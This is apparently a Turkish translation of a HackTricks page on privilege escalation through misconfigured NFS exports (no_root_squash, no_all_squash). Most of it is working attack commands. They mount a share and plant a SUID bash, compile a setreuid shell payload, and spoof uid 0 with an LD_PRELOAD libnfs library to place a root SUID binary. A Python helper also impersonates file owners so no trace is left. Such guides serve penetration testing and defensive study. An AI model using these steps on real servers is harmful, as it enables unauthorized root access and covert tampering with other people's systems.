{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


_ **/etc/exports** _ dosyasını okuyun, eğer **no\_root\_squash** olarak yapılandırılmış bir dizin bulursanız, o dizine **istemci olarak erişebilir** ve o dizin içinde **yerel makinenin root'uymuş gibi yazabilirsiniz.**

**no\_root\_squash**: Bu seçenek, istemcideki root kullanıcısına NFS sunucusundaki dosyalara root olarak erişim yetkisi verir. Bu da ciddi güvenlik sorunlarına yol açabilir.

**no\_all\_squash:** Bu, **no\_root\_squash** seçeneğine benzer, ancak **root olmayan kullanıcılara** uygulanır. Hayal edin, nobody kullanıcısı olarak bir shell'iniz var; /etc/exports dosyasını kontrol ettiniz; no\_all\_squash seçeneği mevcut; /etc/passwd dosyasını kontrol edin; root olmayan bir kullanıcıyı taklit edin; o kullanıcı olarak bir suid dosyası oluşturun (nfs kullanarak montaj yaparak). SUID'yi nobody kullanıcısı olarak çalıştırın ve farklı bir kullanıcıya dönüşün.

# Privilege Escalation

## Remote Exploit

Bu güvenlik açığını bulduysanız, bunu istismar edebilirsiniz:

* **O dizini** bir istemci makinesinde **montajlayarak**, ve **root olarak** montajlı klasöre **/bin/bash** ikili dosyasını kopyalayarak ve ona **SUID** hakları vererek, o bash ikili dosyasını **kurban** makinesinden çalıştırarak.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **O dizini** bir istemci makinesine **bağlamak** ve **root olarak** bağlı klasöre SUID iznini kötüye kullanacak derlenmiş yükümüzü kopyalamak, ona **SUID** hakları vermek ve **kurban** makineden o ikili dosyayı çalıştırmak (burada bazı [C SUID yüklerini](payloads-to-execute.md#c) bulabilirsiniz).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Yerel Sömürü

{% hint style="info" %}
Not edin ki eğer **makinenizden kurban makinesine bir tünel oluşturabiliyorsanız, bu ayrıcalık yükseltmesini istismar etmek için Uzaktan versiyonu kullanmaya devam edebilirsiniz**.\
Aşağıdaki hile, dosya `/etc/exports` **bir IP gösteriyorsa** geçerlidir. Bu durumda **uzaktan istismarı kullanamayacaksınız** ve **bu hileyi kötüye kullanmanız gerekecek**.\
İstismarın çalışması için bir diğer gerekli şart, **`/etc/export` içindeki ihracatın** **`insecure` bayrağını kullanmasıdır**.\
\--_Eğer `/etc/export` bir IP adresi gösteriyorsa bu hilenin çalışıp çalışmayacağından emin değilim_--
{% endhint %}

## Temel Bilgiler

Senaryo, yerel bir makinede monte edilmiş bir NFS paylaşımını istismar etmeyi içeriyor ve bu, istemcinin uid/gid'ini belirtmesine izin veren NFSv3 spesifikasyonundaki bir hatayı kullanarak yetkisiz erişim sağlama potansiyeli sunuyor. İstismar, NFS RPC çağrılarını sahtelemek için bir kütüphane olan [libnfs](https://github.com/sahlberg/libnfs) kullanmayı içeriyor.

### Kütüphaneyi Derleme

Kütüphane derleme adımları, çekirdek sürümüne bağlı olarak ayarlamalar gerektirebilir. Bu özel durumda, fallocate sistem çağrıları yorum satırına alınmıştı. Derleme süreci aşağıdaki komutları içerir:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Sömürü Gerçekleştirme

Sömürü, root ayrıcalıklarını artıran ve ardından bir shell çalıştıran basit bir C programı (`pwn.c`) oluşturmayı içerir. Program derlenir ve elde edilen ikili dosya (`a.out`), RPC çağrılarında uid'yi sahte olarak göstermek için `ld_nfs.so` kullanarak suid root ile paylaşıma yerleştirilir:

1. **Sömürü kodunu derleyin:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Sömürü paylaşımda yerleştirin ve uid'yi sahte göstererek izinlerini değiştirin:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Root ayrıcalıkları kazanmak için sömürüyü çalıştırın:**
```bash
/mnt/share/a.out
#root
```

## Bonus: NFShell için Gizli Dosya Erişimi
Root erişimi elde edildikten sonra, sahipliği değiştirmeden (iz bırakmamak için) NFS paylaşımı ile etkileşimde bulunmak için bir Python betiği (nfsh.py) kullanılır. Bu betik, erişilen dosyanın uid'sini eşleştirerek, paylaşımda dosyalarla izin sorunları olmadan etkileşimde bulunmayı sağlar:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Çalıştırın gibi:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
